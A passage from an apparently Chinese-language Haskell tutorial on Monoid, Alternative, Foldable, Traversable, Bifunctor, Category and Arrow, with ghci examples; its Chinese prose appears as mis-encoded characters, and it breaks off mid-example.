= x &lt;&gt; (y &lt;&gt; z) è¡¥ï¼šNonEmptyNonEmptyè¡¨ç¤ºéç©ºåˆ—è¡¨ï¼Œå®šä¹‰æ˜¯ï¼š 1data NonEmpty a = a :| [a] deriving (Eq, Ord) ä½¿ç”¨ä¸€ä¸ªå…ƒç´ å’Œä¸€ä¸ªåˆ—è¡¨ç”¨:|è¿æ¥å°±å¯ä»¥ç”Ÿæˆä¸€ä¸ªNonEmptyç±»å‹çš„åˆ—è¡¨ Data.List.NonEmptyæ¨¡å—ä¸­å®ç°äº†å¾ˆå¤šæ™®é€šåˆ—è¡¨æœ‰çš„å‡½æ•°ï¼Œéœ€è¦qualified importåè°ƒç”¨ï¼Œä½¿ç”¨fromListã€toListå‡½æ•°å¯ä»¥åœ¨æ™®é€šåˆ—è¡¨å’Œéç©ºåˆ—è¡¨ä¹‹é—´è½¬æ¢ 12345678ghci&gt; import qualified Data.List.NonEmpty as NEghci&gt; arr = NE.fromList [1, 2, 3]ghci&gt; arr1 :| [2,3]ghci&gt; NE.head arr 1ghci&gt; NE.tail arr [2,3] Monoidå¹ºåŠç¾¤ï¼ˆMonoidï¼‰æ˜¯ä¸€ä¸ªæœ‰å•ä½å…ƒç´ $e$çš„åŠç¾¤ï¼Œå³$e$æ»¡è¶³ï¼š $$e\\oplus x = x\\oplus e = x$$ 12345678class Semigroup a =&gt; Monoid a where mempty :: a mappend :: a -&gt; a -&gt; a mappend = (&lt;&gt;) mconcat :: [a] -&gt; a mconcat = foldr mappend mempty å¯ä»¥çœ‹å‡ºMonoidè¦æ±‚äº†ä¸‰ä¸ªå‡½æ•°ï¼Œå…¶ä¸­æœ€å°‘åªéœ€è¦memptyï¼Œå®ƒç›´æ¥è¿”å›ä¸€ä¸ªå€¼ï¼Œè¡¨ç¤ºå•ä½å…ƒç´ ã€‚mappendå³Semigroupä¸­çš„&lt;&gt;è¿ç®—ç¬¦ï¼Œmconcatä¹Ÿæä¾›äº†é»˜è®¤å®ç° å®ä¾‹[a]å› ä¸ºMonoidçš„å®ä¾‹æ˜¯ä¸€ä¸ªå…·ä½“ç±»å‹ï¼Œè€Œä¸æ˜¯åƒFunctorç­‰ä¸€æ ·ç­‰ç±»å‹æ„é€ å™¨ï¼Œæ‰€ä»¥[]å¹¶ä¸æ˜¯Monoidçš„å®ä¾‹ï¼Œä½†æ˜¯å…·ä½“ç±»å‹[a]æ˜¯ä¸€ä¸ªå¹ºåŠç¾¤ï¼š 123456instance Semigroup [a] where (&lt;&gt;) = (++)instance Monoid [a] where mempty = [] mconcat xss = [x | xs &lt;- xss, x &lt;- xs] åˆ—è¡¨çš„å•ä½å…ƒç´ (mempty)å°±æ˜¯ç©ºåˆ—è¡¨[]ï¼Œè¿ç®—ç¬¦å°±æ˜¯åˆå¹¶åˆ—è¡¨(++)ï¼Œmconcatä¹Ÿç”¨åˆ—è¡¨æ¨å¯¼é‡æ–°å®ç°æé«˜æ•ˆç‡ 12345678ghci&gt; mempty :: [Int] []ghci&gt; [1, 2] &lt;&gt; [3, 4][1,2,3,4]ghci&gt; [1, 2] `mappend` [3, 4][1,2,3,4]ghci&gt; mconcat [[1,2], [3,4]][1,2,3,4] Ordering1234567instance Semigroup Ordering where LT &lt;&gt; _ = LT EQ &lt;&gt; y = y GT &lt;&gt; _ = GTinstance Monoid Ordering where mempty = EQ ä¸»è¦å¯ä»¥ç”¨äºæ¯”è¾ƒå­—å…¸åºï¼š 12ghci&gt; mconcat (zipWith compare &quot;abcd&quot; &quot;acbd&quot;)LT Sum &amp; Productå¯¹äºæ•°å­—ï¼ŒåŠ æ³•å’Œä¹˜æ³•éƒ½æ»¡è¶³ç»“åˆå¾‹ï¼Œæ‰€ä»¥å¯¹äºNumï¼Œæœ‰ä¸¤ç§å®ç°Monoidçš„æ–¹å¼ï¼Œä½†æ˜¯ä¸èƒ½ä¸ºåŒä¸€ç±»å‹è®¾ç½®ä¸¤ç§å®ä¾‹æ–¹å¼ï¼Œæ‰€ä»¥Data.Monoidä¸­æä¾›äº†ä¸¤ä¸ªåŒ…è£…å™¨â€”â€”â€”â€”Sumå’ŒProductï¼š 12newtype Sum a = Sum {getSum :: a} deriving (...)newtype Product a = Product {getProduct :: a} deriving (...) å®ƒä»¬ä½¿ç”¨Sumæˆ–Productæ¥åŒ…è£…èµ·ä¸€ä¸ªæ•°å­—ï¼Œå¯ä»¥é€šè¿‡getSumæˆ–getProductæ¥è·å–å…¶ä¸­çš„å€¼ å¯¹äºåŠ æ³•ï¼ŒäºŒå…ƒæ“ä½œä¸º(+)ï¼Œå•ä½å…ƒç´ ä¸º0ï¼›å¯¹äºä¹˜æ³•ï¼ŒäºŒå…ƒæ“ä½œä¸º(*)ï¼Œå•ä½å…ƒç´ ä¸º1: 1234567891011instance Num a =&gt; Semigroup (Sum a) where (&lt;&gt;) = coerce ((+) :: a -&gt; a -&gt; a)instance Num a =&gt; Monoid (Sum a) where mempty = Sum 0instance Num a =&gt; Semigroup (Product a) where (&lt;&gt;) = coerce ((*) :: a -&gt; a -&gt; a)instance Num a =&gt; Monoid (Product a) where mempty = Product 1 12345678ghci&gt; Sum 5 &lt;&gt; Sum 6 &lt;&gt; Sum 10Sum {getSum = 21}ghci&gt; getSum . mconcat . fmap Sum $ [5, 6, 10]21ghci&gt; Product 5 &lt;&gt; Product 6 &lt;&gt; Product 10Product {getProduct = 300}ghci&gt; getProduct . mconcat . fmap Product $ [5, 6, 10]300 All &amp; Anyå’Œæ•°å­—ä¸€æ ·ï¼Œå¸ƒå°”å€¼ä¹Ÿæœ‰ä¸¤ç§å®ç°Monoidçš„æ–¹å¼ï¼Œå› æ­¤Data.Monoidæ¨¡å—ä¸­ä¹Ÿæä¾›äº†ä¸¤ä¸ªåŒ…è£…å™¨ï¼Œåˆ†åˆ«å®ç°äº†è¿™ä¸¤ç§Monoidï¼š 12345678910111213141516newtype All = All { getAll :: Bool } deriving (...)instance Semigroup All where (&lt;&gt;) = coerce (&amp;&amp;)instance Monoid All where mempty = All Truenewtype Any = Any { getAny :: Bool } deriving (...)instance Semigroup Any where (&lt;&gt;) = coerce (||)instance Monoid Any where mempty = Any False 12345678ghci&gt; getAll (All True &lt;&gt; mempty &lt;&gt; All False)Falseghci&gt; getAll (mconcat (map (\\x -&gt; All (even x)) [2,4,6,7,8]))Falseghci&gt; getAny (Any True &lt;&gt; mempty &lt;&gt; Any False)Trueghci&gt; getAny (mconcat (map (\\x -&gt; Any (even x)) [2,4,6,7,8]))True Monoid a =&gt; Maybe aå¦‚æœaæ˜¯ä¸€ä¸ª(å¹º)åŠç¾¤ï¼Œé‚£ä¹ˆMaybe aä¹Ÿæ˜¯ä¸€ä¸ªå¹ºåŠç¾¤ï¼Œå•ä½å…ƒå°±æ˜¯Nothingï¼š 1234567instance Semigroup a =&gt; Semigroup (Maybe a) where Nothing &lt;&gt; b = b a &lt;&gt; Nothing = a Just a &lt;&gt; Just b = Just (a &lt;&gt; b)instance Semigroup a =&gt; Monoid (Maybe a) where mempty = Nothing 123456ghci&gt; Nothing &lt;&gt; Just &quot;andy&quot;Just &quot;andy&quot;ghci&gt; Just LT &lt;&gt; NothingJust LTghci&gt; Just (Sum 3) &lt;&gt; Just (Sum 4) Just (Sum {getSum = 7}) First &amp; Lastå¯¹äºMaybeä¹Ÿæœ‰ä¸¤ç§å®ç°Monoidçš„æ–¹æ³•ï¼Œå³&lt;&gt;æ“ä½œæ¯æ¬¡æ’å–å·¦è¾¹å’Œæ¯æ¬¡æ’å–å³è¾¹ï¼ˆåœ¨æ²¡æœ‰Nothingçš„æƒ…å†µä¸‹ï¼‰ï¼Œæ‰€ä»¥Data.Monoidæ¨¡å—ä¸­ä¹Ÿæä¾›äº†ä¸¤ä¸ªæ–°çš„åŒ…è£…å™¨ï¼šFirstå’ŒLastï¼š 123456789101112131415161718newtype First a = First { getFirst :: Maybe a } deriving (...)instance Semigroup (First a) where First Nothing &lt;&gt; b = b a &lt;&gt; _ = ainstance Monoid (First a) where mempty = First Nothingnewtype Last a = Last { getLast :: Maybe a } deriving (...)instance Semigroup (Last a) where a &lt;&gt; Last Nothing = a _ &lt;&gt; b = binstance Monoid (Last a) where mempty = Last Nothing 12345678ghci&gt; getFirst (First (Just &quot;hello&quot;) &lt;&gt; First Nothing &lt;&gt; First (Just &quot;world&quot;))Just &quot;hello&quot;ghci&gt; getLast (Last (Just &quot;hello&quot;) &lt;&gt; Last Nothing &lt;&gt; Last (Just &quot;world&quot;))Just &quot;world&quot;ghci&gt; getFirst . mconcat . map First $ [Nothing, Just 9, Just 10] Just 9ghci&gt; getLast . mconcat . map Last $ [Nothing, Just 9, Just 10] Just 10 Min &amp; Maxå¯¹äºæœ‰ç•Œçš„ç±»å‹ï¼Œä¹Ÿæœ‰ä¸¤ç§å®ç°Monoidçš„æ–¹å¼ï¼Œæ¯æ¬¡äºŒå…ƒæ“ä½œéƒ½å–æœ€å°æˆ–æœ€å¤§ã€‚Data.Semigroupæ¨¡å—ä¸­æä¾›äº†ä¸¤ä¸ªåŒ…è£…å…¶å™¨ï¼šMinå’ŒMaxï¼š 12345678910111213141516newtype Min a = Min { getMin :: a } deriving (...)instance Ord a =&gt; Semigroup (Min a) where (&lt;&gt;) = coerce (min :: a -&gt; a -&gt; a)instance (Ord a, Bounded a) =&gt; Monoid (Min a) where mempty = maxBoundnewtype Max a = Max { getMax :: a } deriving (...)instance Ord a =&gt; Semigroup (Max a) where (&lt;&gt;) = coerce (max :: a -&gt; a -&gt; a)instance (Ord a, Bounded a) =&gt; Monoid (Max a) where mempty = minBound 12345678ghci&gt; Min 3 &lt;&gt; Min 5Min {getMin = 3}ghci&gt; Max 3 &lt;&gt; Max 5Max {getMax = 5}ghci&gt; getMin . mconcat . map Min $ [1,2,3] :: Int1ghci&gt; getMax . mconcat . map Max $ [1,2,3] :: Int3 å…ƒç»„å½“å…ƒç»„å†…çš„æ‰€æœ‰å…ƒç´ éƒ½æ˜¯å¹ºåŠç¾¤æ—¶ï¼Œæ•´ä¸ªå…ƒç»„ä¹Ÿæ˜¯ä¸€ä¸ªå¹ºåŠç¾¤ï¼š 123456instance (Semigroup a, Semigroup b) =&gt; Semigroup (a, b) where (a,b) &lt;&gt; (a',b') = (a&lt;&gt;a',b&lt;&gt;b') stimes n (a,b) = (stimes n a, stimes n b)instance (Monoid a, Monoid b) =&gt; Monoid (a,b) where mempty = (mempty, mempty) 12ghci&gt; mconcat $ map (\\x -&gt; (Min x, Max x)) [1..10] :: (Min Int, Max Int)(Min {getMin = 1},Max {getMax = 10}) Monoid Laws mempty &lt;&gt; x = x x &lt;&gt; mempty = x (x &lt;&gt; y) &lt;&gt; z = x &lt;&gt; (y &lt;&gt; z) Monoidal classesApplicativeã€Monadã€Arrowéƒ½æœ‰æœ‰å¹ºåŠç¾¤æ€§è´¨çš„å­ç±»å‹ç±»ï¼Œåˆ†åˆ«æ˜¯Alternativeã€MonadPlusã€ArrowPlus Alternative12345678910class Applicative f =&gt; Alternative f where -- | The identity of '&lt;|&gt;' empty :: f a -- | An associative binary operation (&lt;|&gt;) :: f a -&gt; f a -&gt; f a some :: f a -&gt; f [a] some v = (:) &lt;$&gt; v &lt;*&gt; many v many :: f a -&gt; f [a] many v = some v &lt;|&gt; pure [] å…¶ä¸­emptyæ˜¯å¹ºåŠç¾¤ä¸­çš„å•ä½å…ƒç´ ï¼Œ&lt;|&gt;æ˜¯å¹ºåŠç¾¤ä¸­çš„äºŒå…ƒè¿ç®—ç¬¦ã€‚someå’Œmanyæ˜¯ä¸¤ä¸ªå‡½æ•°ï¼ˆæ„ä¹‰è¿˜ä¸æ‡‚ï¼‰ Alternativeå®ä¾‹[]123instance Alternative [] where empty = [] (&lt;|&gt;) = (++) å’ŒMonoidä¸€æ ·ï¼Œå•ä½å…ƒç´ æ˜¯ç©ºåˆ—è¡¨ï¼ŒäºŒå…ƒè¿ç®—æ˜¯åˆ—è¡¨åˆå¹¶ 123456ghci&gt; [1,2,3] &lt;|&gt; empty &lt;|&gt; [4,5][1,2,3,4,5]ghci&gt; some [][]ghci&gt; many [][[]] Maybe1234instance Alternative Maybe where empty = Nothing Nothing &lt;|&gt; r = r l &lt;|&gt; _ = l Maybeä½œä¸ºAlternativeçš„å•ä½å…ƒç´ æ˜¯Nothingï¼ŒäºŒå…ƒè¿ç®—æ˜¯å§‹ç»ˆå–å·¦è¾¹ï¼ˆå½“å·¦è¾¹ä¸ä¸ºNothingæ—¶ï¼‰ 123456ghci&gt; Nothing &lt;|&gt; Just 1 &lt;|&gt; Just 2 Just 1 ghci&gt; some NothingNothing ghci&gt; many Nothing Just [] ZipList123instance Alternative ZipList where empty = ZipList [] ZipList xs &lt;|&gt; ZipList ys = ZipList (xs ++ drop (length xs) ys) 1234&lt;&gt;getZipList $ ZipList [1,2] &lt;|&gt; ZipList [3,4,5,6][1,2,5,6]&lt;&gt;getZipList $ ZipList [1,2,3,4] &lt;|&gt; ZipList [3,4,5,6][1,2,3,4] Alternative Laws Monoid laws: 123empty &lt;|&gt; x = x x &lt;|&gt; empty = x (x &lt;|&gt; y) &lt;|&gt; z = x &lt;|&gt; (y &lt;|&gt; z) Left zero lawï¼šempty &lt;*&gt; f = emptyä»¥ä¸Šçš„å®šå¾‹æ˜¯éƒ½æ»¡è¶³éƒ½ï¼Œä¸‹é¢çš„å®šå¾‹åªæœ‰éƒ¨åˆ†æ»¡è¶³ï¼š Right zero lawï¼šf &lt;*&gt; empty = empty ï¼ˆå¤§éƒ¨åˆ†åŒ…æ‹¬Maybeã€[]æ»¡è¶³ï¼ŒIOä¸æ»¡è¶³ï¼‰ Left distributionï¼š(a &lt;|&gt; b) &lt;*&gt; c = (a &lt;*&gt; c) &lt;|&gt; (b &lt;*&gt; c) ï¼ˆMaybeã€[]æ»¡è¶³ï¼ŒIOåŠå¤§éƒ¨åˆ†parsersä¸æ»¡è¶³ï¼‰ Right distributionï¼ša &lt;*&gt; (b &lt;|&gt; c) = (a &lt;*&gt; b) &lt;|&gt; (a &lt;*&gt; c) ï¼ˆå¤§éƒ¨åˆ†ä¸æ»¡è¶³ï¼Œä½†Maybeæ»¡è¶³ï¼‰ Left catchï¼š(pure a) &lt;|&gt; x = pure a ï¼ˆMaybeã€IOã€parsersæ»¡è¶³ï¼Œä½†[]ä¸æ»¡è¶³ï¼‰ å¸¸ç”¨å‡½æ•° asum :: (Foldable t, Alternative f) =&gt; t (f a) -&gt; f aï¼Œç›¸å½“äºfoldr (&lt;|&gt;) emptyï¼š 1234ghci&gt; asum [Nothing, Just 5, Just 3]Just 5ghci&gt; asum [[2],[3],[4,5]][2,3,4,5] guard :: (Alternative f) =&gt; Bool -&gt; f ()ï¼š 12guard True = pure ()guard False = empty MonadPlus123456class (Alternative m, Monad m) =&gt; MonadPlus m where mzero :: m a mzero = empty mplus :: m a -&gt; m a -&gt; m a mplus = (&lt;|&gt;) MonadPluså®ä¾‹[]ã€Maybeéƒ½æ˜¯MonadPlusçš„å®ä¾‹ï¼Œmzeroå’Œmpluséƒ½ç”±Alternativeå®ç° MonadPlus Laws Monoid laws Left zeroï¼šmzero &gt;&gt;= f = mzero Right zeroï¼šm &gt;&gt; mzero = mzero å¸¸ç”¨å‡½æ•° msum = asum mfilterï¼š 123mfilter p ma = do a &lt;- ma if p a then return a else mzero ArrowPlusArrowZeroå’ŒArrowPlusåˆ†åˆ«ä¸ºArrowè®¾ç½®äº†Monoidä¸­çš„å•ä½å…ƒç´ å’ŒäºŒå…ƒè¿ç®—ç¬¦ï¼Œä½¿ä¹‹æˆä¸ºäº†ä¸€ä¸ªå¹ºåŠç¾¤ï¼š 12345class Arrow arr =&gt; ArrowZero arr where zeroArrow :: b `arr` cclass ArrowZero arr =&gt; ArrowPlus arr where (&lt;+&gt;) :: (b `arr` c) -&gt; (b `arr` c) -&gt; (b `arr` c) ä¸€äº›å…¶å®ƒtypeclassesFoldableFoldableæ˜¯è¡¨ç¤ºå¯ä»¥æŠ˜å ï¼ˆfoldï¼‰çš„ç±»å‹ç±»ï¼Œåœ¨Data.Foldableä¸­å®šä¹‰ï¼Œè¿™ä½¿å¾—å’Œfoldç›¸å…³çš„å‡½æ•°å¯ä»¥ç”¨åœ¨ä»»æ„Foldableçš„å®ä¾‹ç±»å‹ä¸Šã€‚å®ƒçš„å®šä¹‰æ˜¯ï¼š 12345678910111213141516171819class Foldable t where fold :: Monoid m =&gt; t m -&gt; m foldMap :: Monoid m =&gt; (a -&gt; m) -&gt; t a -&gt; m foldMap' :: Monoid m =&gt; (a -&gt; m) -&gt; t a -&gt; m foldr :: (a -&gt; b -&gt; b) -&gt; b -&gt; t a -&gt; b foldr' :: (a -&gt; b -&gt; b) -&gt; b -&gt; t a -&gt; b foldl :: (b -&gt; a -&gt; b) -&gt; b -&gt; t a -&gt; b foldl' :: (b -&gt; a -&gt; b) -&gt; b -&gt; t a -&gt; b foldr1 :: (a -&gt; a -&gt; a) -&gt; t a -&gt; a foldl1 :: (a -&gt; a -&gt; a) -&gt; t a -&gt; a toList :: t a -&gt; [a] null :: t a -&gt; Bool length :: t a -&gt; Int elem :: Eq a =&gt; a -&gt; t a -&gt; Bool maximum :: Ord a =&gt; t a -&gt; a minimum :: Ord a =&gt; t a -&gt; a sum :: Num a =&gt; t a -&gt; a product :: Num a =&gt; t a -&gt; a {-# MINIMAL foldMap | foldr #-} æœ€å°‘åªè¦å®ç°foldrå’ŒfoldMapå…¶ä¸­ä¹‹ä¸€å°±å¯ä»¥ä½¿ä¸€ä¸ªç±»å‹æˆä¸ºFoldableçš„å®ä¾‹ï¼Œå…¶å®ƒçš„å‡½æ•°éƒ½æœ‰ç”±è¿™ä¸¤ä¸ªå‡½æ•°æä¾›çš„é»˜è®¤å®ç°ï¼Œè€Œä¸”è¿™ä¸¤ä¸ªå‡½æ•°ä¹‹é—´ä¹Ÿæœ‰ç›¸äº’å®ç°ã€‚å› æ­¤åªè¦å®ç°foldræˆ–foldMapä¸€ä¸ªå‡½æ•°å°±å¯ä»¥ä½¿ç”¨æ‰€æœ‰å…¶å®ƒFoldableä¸­çš„å‡½æ•°ã€‚foldrå‡½æ•°åœ¨å‰é¢å·²ç»æœ‰å­¦è¿‡ï¼ŒfoldMapçš„ä¾‹å­æ˜¯ï¼š 123456ghci&gt; foldMap Sum [1, 3, 5]Sum {getSum = 9}ghci&gt; foldMap Product [1, 3, 5]Product {getProduct = 15}ghci&gt; foldMap (replicate 3) [1, 2, 3][1,1,1,2,2,2,3,3,3] Foldableå®ä¾‹[]ã€Maybeã€Either aã€(,) aéƒ½æ˜¯Foldableçš„å®ä¾‹ï¼Œæ ‡å‡†å®¹å™¨åº“ä¸­çš„Mapã€Setç­‰ä¹Ÿéƒ½æ˜¯Foldableçš„å®ä¾‹ã€‚ä¹Ÿå¯ä»¥è‡ªå®šä¹‰äºŒå‰æ ‘ç±»å‹ï¼Œå¹¶ä½¿å…¶æˆä¸ºFoldableçš„å®ä¾‹ï¼š 1234567data Tree a = Empty | Leaf a | Node (Tree a) a (Tree a)instance Foldable Tree where foldMap :: Monoid m =&gt; (a -&gt; m) -&gt; Tree a -&gt; m foldMap f Empty = mempty foldMap f (Leaf x) = f x foldMap f (Node l k r) = foldMap f l `mappend` f k `mappend` foldMap f r å¸¸ç”¨å‡½æ•° asum :: (Alternative f, Foldable t) =&gt; t (f a) -&gt; f aï¼Œç”¨&lt;|&gt;é€ä¸ªè¿æ¥æ‰€æœ‰å…ƒç´  sequenceA_ :: (Applicative f, Foldable t) =&gt; t (f a) -&gt; f ()ï¼Œç”±äºä¸¢å¼ƒç»“æœï¼Œæ‰€ä»¥Foldable tå°±å¯ä»¥æ»¡è¶³ï¼›å› æ­¤ä¸åŒäºsequenceAéœ€è¦Traversable traverse_ :: (Applicative f, Foldable t) =&gt; (a -&gt; f b) -&gt; t a -&gt; f () for_ :: (Applicative f, Foldable t) =&gt; t a -&gt; (a -&gt; f b) -&gt; f () TraversableTraversableæ˜¯è¡¨ç¤ºå¯éå†çš„ç±»å‹ç±»ï¼Œåœ¨Data.Traversableæ¨¡å—ä¸­å®šä¹‰ï¼Œå®ƒæ˜¯Foldableçš„å‡çº§ç‰ˆï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªFunctorï¼Œå®ƒçš„å®šä¹‰æ˜¯ï¼š 123456class (Functor t, Foldable t) =&gt; Traversable t where traverse :: Applicative f =&gt; (a -&gt; f b) -&gt; t a -&gt; f (t b) sequenceA :: Applicative f =&gt; t (f a) -&gt; f (t a) mapM :: Monad m =&gt; (a -&gt; m b) -&gt; t a -&gt; m (t b) sequence :: Monad m =&gt; t (m a) -&gt; m (t a) {-# MINIMAL traverse | sequenceA #-} æœ€å°‘åªéœ€è¦å®ç°traverseå‡½æ•°æˆ–è€…sequenceAå‡½æ•°ã€‚å…¶ä¸­å„ä¸ªå‡½æ•°çš„åŠŸèƒ½é€šè¿‡ç±»å‹ç­¾åä¹Ÿéƒ½èƒ½æ¨æµ‹å‡ºæ¥ã€‚ä½†æ˜¯å…¶ä¸­mapMå°±æ˜¯traverseï¼Œsequenceå°±æ˜¯sequenceAï¼Œå®ƒä»¬å­˜åœ¨åªæ˜¯å†å²é—ç•™ï¼ˆ Traversableå®ä¾‹1234567891011121314151617instance Traversable Maybe where traverse _ Nothing = pure Nothing traverse f (Just x) = Just &lt;$&gt; f xinstance Traversable [] where {-# INLINE traverse #-} traverse f = foldr cons_f (pure []) where cons_f x ys = liftA2 (:) (f x) ysinstance Traversable (Either a) where traverse _ (Left x) = pure (Left x) traverse f (Right y) = Right &lt;$&gt; f yinstance Traversable ((,) a) where traverse f (x, y) = (,) x &lt;$&gt; f y... ä¸Šé¢çš„Treeä¹Ÿå¯ä»¥æˆä¸ºTraversableçš„å®ä¾‹ï¼š 123456789101112131415instance Functor Tree where fmap :: (a -&gt; b) -&gt; Tree a -&gt; Tree b fmap g Empty = Empty fmap g (Leaf x) = Leaf $ g x fmap g (Node l x r) = Node (fmap g l) (g x) (fmap g r)instance Traversable Tree where traverse :: Applicative f =&gt; (a -&gt; f b) -&gt; Tree a -&gt; f (Tree b) traverse g Empty = pure Empty traverse g (Leaf x) = Leaf &lt;$&gt; g x traverse g (Node l x r) = Node &lt;$&gt; traverse g l &lt;*&gt; g x &lt;*&gt; traverse g r Traversable LawsTraversableä¹Ÿæœ‰ä¸¤æ¡å®šå¾‹ï¼š traverse Identity = Identity traverse (Compose . fmap g . f) = Compose . fmap (traverse g) . traverse f å…¶ä¸­Identityå’ŒComposeåˆ†åˆ«å®šä¹‰åœ¨Data.Functor.Identityå’ŒData.Functor.Composeä¸¤ä¸ªæ¨¡å—ä¸­ï¼š 12newtype Identity a = Identity { runIdentity :: a } deriving (...)newtype Compose f g a = Compose { getCompose :: f (g a) } deriving (...) BifunctorFunctorçš„å®ä¾‹çš„kindéƒ½æ˜¯* -&gt; *ï¼Œå› æ­¤fmapåªèƒ½å°†ä¸€ä¸ªå‡½æ•°æ˜ å°„åˆ°ä¸€ä¸ªå€¼ä¸Šã€‚è€ŒBifunctorï¼ˆåœ¨Data.Bifunctoræ¨¡å—ä¸­å®šä¹‰ï¼‰çš„å®ä¾‹çš„kindæ˜¯* -&gt; * -&gt; *ï¼Œè€Œä¸”å®ƒçš„bimapå¯ä»¥åŒæ—¶å°†ä¸¤ä¸ªå‡½æ•°æ˜ å°„åˆ°ä¸¤ä¸ªå€¼ä¸Šï¼š 12345class Bifunctor p where bimap :: (a -&gt; b) -&gt; (c -&gt; d) -&gt; p a c -&gt; p b d first :: (a -&gt; b) -&gt; p a c -&gt; p b c second :: (b -&gt; c) -&gt; p a b -&gt; p a c {-# MINIMAL bimap | first, second #-} åŒæ—¶bimapå’Œfirst,secondä¹‹é—´ä¹Ÿå¯ä»¥ç›¸äº’è½¬æ¢ï¼š 1234bimap f g = first f . second gfirst f = bimap f idsecond g = bimap id g å¯¹äºFunctorï¼Œ((,) e)å’ŒEither eæ‰æ˜¯Functorçš„å®ä¾‹ï¼Œå› ä¸ºä»–ä»¬æ˜¯* -&gt; *ã€‚ä½†æ˜¯å¯¹äºBifunctorï¼Œ(,)å’ŒEitherå°±æ˜¯Bifunctorçš„å®ä¾‹ï¼š 12ghci&gt; bimap (+1) length (4, [1,2,3])(5,3) Bifunctor Laws bimap id id = id first id = id second id = id bimap (f . g) (h . i) = bimap f h . bimap g i first (f . g) = first f . first g second (f . g) = second f . second g CategoryHaskellä¸­çš„Categoryå°†ä¸€èˆ¬çš„å‡½æ•°æ¨å¹¿åˆ°äº†æ™®éçš„æ€å°„ä¸Šï¼Œå®ƒåœ¨Control.Categoryæ¨¡å—ä¸­ï¼Œå®šä¹‰æ˜¯ï¼š 123class Category cat where id :: cat a a (.) :: cat b c -&gt; cat a b -&gt; cat a c å®ƒçš„å®ä¾‹æœ‰(-&gt;)å’ŒKleisli mï¼š 123instance Category (-&gt;) where id = GHC.Base.id (.) = (GHC.Base..) Kleisliæ˜¯ä¸€ä¸ªèŒƒç•´ï¼Œç”¨æ¥è¡¨ç¤ºå‡½æ•°a -&gt; m bï¼ŒHaskellä¸­ï¼Œå®ƒåœ¨Control.Arrowæ¨¡å—ä¸­å®šä¹‰ï¼š 12345678newtype Kleisli m a b = Kleisli { runKleisli :: a -&gt; m b }instance Monad m =&gt; Category (Kleisli m) where id :: Kleisli m a a id = Kleisli return (.) :: Kleisli m b c -&gt; Kleisli m a b -&gt; Kleisli m a c Kleisli g . Kleisli h = Kleisli (h &gt;=&gt; g) Categoryè¦æ»¡è¶³çš„å®šå¾‹åªæœ‰idæ˜¯(.)æ“ä½œçš„å•ä½å…ƒï¼Œä»¥åŠ(.)æ“ä½œæ˜¯å¯ç»“åˆçš„ åŒæ—¶Categoryè¿˜æä¾›äº†ä¸¤ä¸ªå‡½æ•°&lt;&lt;&lt;å’Œ&gt;&gt;&gt;ï¼š 12345(&lt;&lt;&lt;) :: Category cat =&gt; cat b c -&gt; cat a b -&gt; cat a c(&lt;&lt;&lt;) = (.)(&gt;&gt;&gt;) :: Category cat =&gt; cat a b -&gt; cat b c -&gt; cat a c f &gt;&gt;&gt; g = g . f ArrowArrowå°†å‡½æ•°è¿›ä¸€æ­¥æŠ½è±¡åŒ–ï¼Œå®ƒå®šä¹‰åœ¨Control.Arrowæ¨¡å—ä¸­ï¼š 1234567class Category a =&gt; Arrow a where arr :: (b -&gt; c) -&gt; a b c first :: a b c -&gt; a (b, d) (c, d) second :: a b c -&gt; a (d, b) (d, c) (***) :: a b c -&gt; a b' c' -&gt; a (b, b') (c, c') (&amp;&amp;&amp;) :: a b c -&gt; a b c' -&gt; a b (c, c') {-# MINIMAL arr, (first | (***)) #-} å…¶ä¸­ï¼š arrå‡½æ•°å°†ä¸€ä¸ªå‡½æ•°å˜æˆä¸€ä¸ªArrow firstå‡½æ•°å°†ä¸€ä¸ªArrowå˜æˆä¸€ä¸ªäºŒå…ƒç»„é—´çš„Arrowï¼Œä¸”åªä¼šå¯¹ä¸€ä¸ªå…ƒç´ è¿›è¡Œæ“ä½œï¼Œç¬¬äºŒä¸ªå…ƒç´ ä¿æŒä¸å˜ secondå‡½æ•°ä¸firstç›¸åï¼Œç¬¬ä¸€ä¸ªå…ƒç´ ä¿æŒä¸å˜ ***å‡½æ•°æ˜¯Arrowä¹‹é—´çš„parallel compositionï¼Œå¯¹äºå‡½æ•°: (g *** h) (x, y) = (g x, h y) &amp;&amp;&amp;å‡½æ•°æ˜¯Arrowä¹‹é—´çš„fanout compositionï¼Œå¯¹äºå‡½æ•°: (g &amp;&amp;&amp; h) x = (g x, h x) å®ƒçš„å®ä¾‹ä¹Ÿæœ‰(-&gt;)å’ŒKleisliï¼š 1234567891011121314instance Arrow (-&gt;) where arr :: (b -&gt; c) -&gt; (b -&gt; c) arr g = g first :: (b -&gt; c) -&gt; ((b,d) -&gt; (c,d)) first g (x,y) = (g x, y)instance Monad m =&gt; Arrow (Kleisli m) where arr :: (b -&gt; c) -&gt; Kleisli m b c arr f = Kleisli (return . f) first :: Kleisli m b c -&gt; Kleisli m (b,d) (c,d) first (Kleisli f) = Kleisli (\\ ~(b,d) -&gt; do c &lt;- f b return (c,d) ) å¸¸ç”¨å‡½æ•°ï¼š 1234567891011121314returnA :: Arrow a =&gt; a b breturnA = arr id(^&gt;&gt;) :: Arrow a =&gt; (b -&gt; c) -&gt; a c d -&gt; a b df ^&gt;&gt; a = arr f &gt;&gt;&gt; a(&gt;&gt;^) :: Arrow a =&gt; a b c -&gt; (c -&gt; d) -&gt; a b da &gt;&gt;^ f = a &gt;&gt;&gt; arr f(&lt;&lt;^) :: Arrow a =&gt; a c d -&gt; (b -&gt; c) -&gt; a b da &lt;&lt;^ f = a &lt;&lt;&lt; arr f(^&lt;&lt;) :: Arrow a =&gt; (c -&gt; d) -&gt; a b c -&gt; a b df ^&lt;&lt; a = arr f &lt;&lt;&lt; a Arrow notationç±»ä¼¼do-notationï¼ŒArrowä¹Ÿæä¾›äº†ä¸€å¥—æ–¹ä¾¿çš„è¯­å¥ï¼š 1234proc x -&gt; do y &lt;- action1 -&lt; ... z &lt;- action2 -&lt; ... returnA -&lt; ... å…¶ä¸­procä»£æ›¿äº†lambdaè¡¨è¾¾å¼ä¸­çš„æ–œæ \\ï¼Œ-&lt;å³è¾¹çš„ä¸ºè¾“å…¥ï¼Œå·¦è¾¹çš„ä¸ºæ¥æ”¶è¾“å…¥çš„å‡½æ•°ã€‚æ¯”å¦‚ï¼Œä¸‹é¢ä¸‰ç§å†™æ³•è¾¾æˆçš„æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼š 12345678910111213141516171819202122232425262728f :: Int -&gt; (Int, Int)f = \\x 